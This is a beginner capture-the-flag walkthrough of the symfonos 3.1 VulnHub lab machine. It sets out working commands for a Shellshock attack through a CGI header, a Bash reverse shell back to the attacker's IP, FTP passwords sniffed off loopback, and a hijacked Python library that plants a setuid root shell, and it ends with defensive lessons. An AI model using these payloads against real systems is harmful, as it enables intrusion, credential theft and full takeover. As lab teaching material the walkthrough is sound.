# symfonos: 3.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | symfonos: 3.1 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | Zayotic |
| **Released** | 7 April 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/symfonos-31,332/> |
| **Download** | <https://vulnhub.com/entry/symfonos-31,332/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian (ProFTPD 1.3.5b, OpenSSH 7.4p1, Apache 2.4.25) |

> **Note:** VMware and VirtualBox builds can vary slightly ("varies by build"). The
> image on the page, the exact directory names, the CGI user's name and the sniffed
> credentials may differ between rebuilds, but the intended chain below is stable.
> The `3.1` release is a cleaner rebuild of `symfonos: 3` — same story, fewer rabbit
> holes.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- Why **enumeration is a discipline**: this box is beaten by *trying different
  wordlists* and *remembering the trailing slash* (`/dir/` vs `/dir`).
- How to build a **custom wordlist** from a site's own text using `cewl`.
- What a **`cgi-bin` directory** hints at — and how the **Shellshock** bug
  (CVE‑2014‑6271) gives remote code execution (RCE) from a single HTTP header.
- How to read your own identity on a box (`id`) and notice an unusual group.
- How to **sniff loopback traffic with `tcpdump`** to recover credentials sent in
  cleartext over FTP.
- How a **cron job running as root that imports a wildcarded Python library**
  (`ftplib`) can be hijacked to escalate to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP on the lab network. It uses DHCP, so the IP may
> change on every import.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   ________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
   ________________________________________________________________________
   192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
   192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> **How to read it:** `netdiscover` (or `arp-scan -l`) lists live hosts on the
> subnet by watching ARP traffic. `192.168.56.101` is our target.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

> **Why we always start here:** an IP is only valid for *this* boot. Some writeups
> hard-code `10.10.10.10`; your target may be `192.168.56.101`. Always confirm.

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
```

```bash
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** only three services. `22` is for later (once we have a
> password), `80` is the web app we are about to attack, and `21` FTP is a **later**
> clue (remember it — a *root* process will log in over FTP and we will sniff it).

![Nmap scan output](images/02-nmap.png)

### 2.2 FTP — try the easy win first (and fail fast)

```bash
ftp 192.168.56.101
```

```text
Name (192.168.56.101:kali): anonymous
530 Login incorrect.
```

> **Why it matters:** anonymous FTP is *refused*. That is a dead end, and knowing it
> quickly stops you wasting time. Record it and move on to the web server.

### 2.3 Web — enumerate directories (and try *different* wordlists)

Browsing to `http://192.168.56.101/` shows only a picture. View the source; if your
build shows a comment, read it — but likely there is nothing useful.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -recursion | tee ffuf.recurse
```

```text
gate                    [Status: 301, Size: 314]
cerberus                [Status: 301, Size: 316]
tartarus                [Status: 301, Size: 316]
research                [Status: 301, Size: 316]
hermes                  [Status: 301, Size: 314]
```

> **Why it works:** `ffuf` swaps `FUZZ` for each wordlist entry and reports which
> paths exist. `-recursion` re-runs inside every directory it finds. The names here
> are all **Greek underworld** words — and that is a hint.

Walk the directories: `http://192.168.56.101/gate/cerberus/tartarus/research` contains
a page *about* the Underworld and Greek mythology. Harvest its words into a wordlist:

```bash
cewl http://192.168.56.101/gate/cerberus/tartarus/research -w words.txt
```

> **Why it works:** `cewl` crawls the page and extracts its words. A site that talks
> about "Cerberus, Tartarus, Hades, Hermes, Underworld…" is quietly handing us the
> next directory names.

### 2.4 The two enumeration lessons that crack this box

**Lesson 1 — try a trailing slash.** Some servers only reveal a directory when you
ask with a trailing `/`:

```bash
ffuf -ic -c -u http://192.168.56.101/FUZZ/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.slash
```

```text
cgi-bin/                [Status: 403, Size: 279]
```

> **Why it works:** `/cgi-bin/` exists but returns **403 Forbidden** on a plain
> listing. `cgi-bin` is a huge hint: it hosts **CGI scripts**, old shell-script
> programs that are famously vulnerable to **Shellshock**.

**Lesson 2 — lowercase the wordlist.** The first `cewl` run mixed cases; the server is
case-sensitive:

```bash
cewl --lowercase http://192.168.56.101/gate/cerberus/tartarus/research -w words2.txt
ffuf -ic -c -u http://192.168.56.101/cgi-bin/FUZZ -w words2.txt
```

```text
underworld              [Status: 200, Size: 1204]
```

We found the script: `http://192.168.56.101/cgi-bin/underworld`.

![Directory enumeration](images/03-enum.png)

---

## 3. Foothold

### 3.1 Confirm Shellshock (CVE‑2014‑6271)

Shellshock is a bug in **Bash** where a specially crafted *environment variable* is
executed when Bash starts. CGI scripts are launched by the web server with the
request's HTTP headers copied into the environment — so a malicious `User-Agent`
runs as a command.

```bash
curl -A "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://192.168.56.101/cgi-bin/underworld
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
cerberus:x:1001:1001::/home/cerberus:/bin/bash
hades:x:1002:1002::/home/hades:/bin/bash
```

> **Why it works:** the `User-Agent` value begins with `() { :; };` — a Bash *function
> definition*. Bash evaluates the rest (`cat /etc/passwd`) before the script even
> runs. We are now executing commands on the target. We also learned two usernames:
> `cerberus` and `hades`.

![Shellshock confirmed](images/04-shellshock.png)

### 3.2 A reverse shell

Start a listener on Kali:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

Then trigger a callback with Shellshock:

```bash
curl -A "() { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.10/4444 0>&1 &'" \
  http://192.168.56.101/cgi-bin/underworld
```

```text
$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),1003(pcap)
```

> **Why it works:** `/dev/tcp/…` is a Bash feature that opens a TCP connection
> without any external tool. We redirect the shell's input/output through it back to
> our listener. The `&` backgrounds it so the HTTP response still returns.
> **Note:** on some builds the CGI runs as `www-data` instead of `cerberus`; what
> matters is the group membership below ("varies by build").

![Reverse shell foothold](images/05-foothold.png)

### 3.3 Upgrade to a full TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on Kali:
stty raw -echo; fg
# back on target:
export TERM=xterm
```

> **Why it works:** a raw `nc` shell has no job control, no tab completion and no
> `Ctrl+C`. `pty.spawn` gives Bash a pseudo-terminal so interactive tools behave.

### 3.4 Spot the unusual group

```bash
id
find / -group pcap -ls 2>/dev/null
```

```text
-rwxr-xr-x 1 root pcap /usr/sbin/tcpdump
-rwsr-x--- 1 root pcap /usr/sbin/tcpdump  <-- (on some builds tcpdump is group-runnable)
```

> **Why it works:** the user is in the **`pcap`** group — the group that can capture
> network packets. That means we are able to run `tcpdump`. Remember port 21 is open.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find the running job

Upload and run [`pspy`](https://github.com/DominicBreuker/pspy) to watch processes
without needing root:

```bash
./pspy64
```

```text
CMD: UID=0  PID=...  | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py
```

> **Why it works:** `pspy` reads `/proc` to show *new* processes. A script running as
> **UID=0 (root)** on a timer is almost always a cron job — and a prime target.

### 4.2 Sniff the FTP credentials off loopback

The root job logs into FTP, and FTP sends passwords in **cleartext**. Because the
connection goes over `lo` (loopback), we can capture it locally:

```bash
tcpdump -i lo -n -A port 21
```

```text
USER hades
PASS PTpZTfU4vxgzvRBE
230 Login successful.
```

> **Why it works:** `tcpdump` on the loopback interface shows traffic between local
> processes. FTP has **no encryption**, so the username and password appear in plain
> text. We now hold `hades`'s credentials.
> **Note:** the exact password string varies by build.

### 4.3 Become `hades`

```bash
ssh hades@192.168.56.101
# password: PTpZTfU4vxgzvRBE

id
find / -group gods -ls 2>/dev/null
```

```text
uid=1002(hades) gid=1002(hades) groups=1002(hades),1003(gods)
...
drwxrwxr-x 1 root gods /usr/lib/python2.7
```

> **Why it works:** `hades` is in the **`gods`** group, which has **write** access to
> `/usr/lib/python2.7`. Root runs a `python2.7` script from there via cron.

### 4.4 Hijack an imported library

Recall the root cron job: `/usr/bin/python2.7 /opt/ftpclient/ftpclient.py`. That script
imports **`ftplib`**, which lives in the writable library directory. Replace it:

```bash
cat > /usr/lib/python2.7/ftplib.py <<'EOF'
import os
os.system('cp /bin/bash /tmp/bash')
os.system('chmod +s /tmp/bash')
EOF
```

> **Why it works:** Python searches `sys.path` (which includes
> `/usr/lib/python2.7`) for `ftplib.py` at import time. Our file is imported by the
> **root** process, so `os.system(...)` runs as root and plants a **setuid copy of
> Bash** at `/tmp/bash`.

Wait for the cron job, then:

```bash
ls -l /tmp/bash
/tmp/bash -p
```

```text
-rwsr-sr-x 1 root root /tmp/bash
# whoami
root
```

> **Why it works:** the `s` (setuid) bit makes `/tmp/bash` run as **its owner (root)**
> no matter who starts it. `-p` tells Bash to *keep* the elevated privilege.

![Privilege escalation to root](images/06-privesc.png)

### 4.5 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on rooting symfonos:3.1!
(symfonos root proof)
```

![Root flag](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden directories (no trailing slash / case mismatch) | `/cgi-bin/underworld` | Discovered only by better enumeration |
| 2 | **Shellshock** CVE‑2014‑6271 in Bash | `/cgi-bin/underworld` via `User-Agent` | Remote Code Execution as the CGI user |
| 3 | Cleartext FTP + readable loopback | `tcpdump -i lo port 21` | Recovers `hades`'s password |
| 4 | Over-broad `pcap` group | member of `pcap` | Lets a low-priv user capture network traffic |
| 5 | World-writable Python library dir | `/usr/lib/python2.7` (`gods` group) | `ftplib` hijack |
| 6 | Root cron imports a hijackable library | `/opt/ftpclient/ftpclient.py` | Arbitrary code as root |
| 7 | Setuid Bash | `/tmp/bash` planted by the payload | Direct root shell |

## 6. Defensive lessons (blue team)

- **Patch Bash.** Shellshock has been fixed since 2014; any unpatched CGI host is a
  time bomb. Prefer modern frameworks over hand-rolled CGI.
- **Do not pass HTTP headers into the environment of privileged shell scripts**
  unnecessarily, and never run CGI as a shell that can be influenced by input.
- **Encrypt management traffic.** Replace FTP with SFTP/SCP. A cleartext password on
  the wire is a password given away.
- **Apply least privilege to groups.** `pcap` (and `docker`, `adm`, `sudo`) grant far
  more than most users need. Audit group membership regularly.
- **Lock down library directories.** `/usr/lib/python2.7` should never be writable by
  a non-root group. Install dependencies under a controlled path.
- **Cron jobs must not import attacker-writable modules.** Run scheduled scripts from
  a root-owned directory with a fixed `sys.path`, and use absolute imports.
- **Detection ideas:** alert on HTTP requests whose `User-Agent` contains `() {`; on
  `tcpdump` execution by non-admins; on writes to system library directories; and on
  new setuid files under `/tmp` (`auditd`, `falco`).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/symfonos-31,332/>
- Community writeups consulted:
  - [Vulnhub: Symfonos 3 — ikuamike](https://blog.ikuamike.io/posts/2021/symfonos3/)
  - [Symfonos:3 writeup — A70xa (GitHub)](https://github.com/A70xa/Vulnhub-Writeups/blob/main/Symfonos:3/Symfonos:3.md)
  - [Symfonos 3.1 Walkthrough — news4hackers](https://www.news4hackers.com/symfonos-3-1-vuln-hub-machine-walkthrough/)
- Vendor advisories / docs:
  - [CVE‑2014‑6271 (Shellshock) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
  - [Shellshock — Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
  - [HackTricks — Shellshock](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
  - [GTFOBins](https://gtfobins.github.io/) — abusing SUID/sudo binaries
  - [pspy — DominicBreuker (GitHub)](https://github.com/DominicBreuker/pspy)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`ip a` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (21, 22, 80)
- [ ] `images/03-enum.png` — directory enumeration (`cgi-bin` + `underworld`)
- [ ] `images/04-shellshock.png` — confirming Shellshock with `curl -A`
- [ ] `images/05-foothold.png` — reverse shell as `cerberus`
- [ ] `images/06-privesc.png` — `ftplib` hijack → setuid Bash → root
- [ ] `images/07-root-flag.png` — `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
